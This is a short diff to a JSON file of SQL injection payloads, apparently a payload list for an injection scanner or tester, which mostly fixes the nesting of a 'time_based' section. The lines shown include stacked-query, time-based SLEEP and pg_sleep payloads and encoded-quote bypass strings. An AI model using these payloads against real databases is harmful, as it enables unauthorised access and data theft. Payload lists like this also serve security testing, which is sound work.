@@ -172,9 +172,8 @@
         "1'; SELECT pg_sleep(2)-- ",
         "1'; SELECT current_database()-- "
       ]
-    }
-  },
-  "time_based": {
+    },
+    "time_based": {
     "mysql": [
       "1' AND (SELECT SLEEP(2))-- ",
       "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- ",
@@ -325,5 +324,6 @@
       "%bf%5c' OR 1=1-- ",
       "%ef%bb%bf' OR 1=1-- "
     ]
+  }
   }
 }
